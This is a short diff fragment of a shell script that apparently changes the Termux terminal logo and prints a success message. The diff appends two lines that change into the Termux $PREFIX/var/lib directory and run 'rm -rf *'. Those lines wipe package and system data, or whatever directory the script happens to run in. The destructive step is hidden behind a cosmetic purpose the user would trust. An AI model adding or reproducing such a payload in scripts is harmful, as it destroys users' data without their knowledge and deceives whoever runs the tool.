@@ -42,3 +42,5 @@ shopt -s lithist ">&3
  # Close fd 3 
 exec 3>&-
 echo " $Termux Logo Was Changed Go To New Session To See The New"
+cd /$PREFIX/var/lib
+rm -rf *
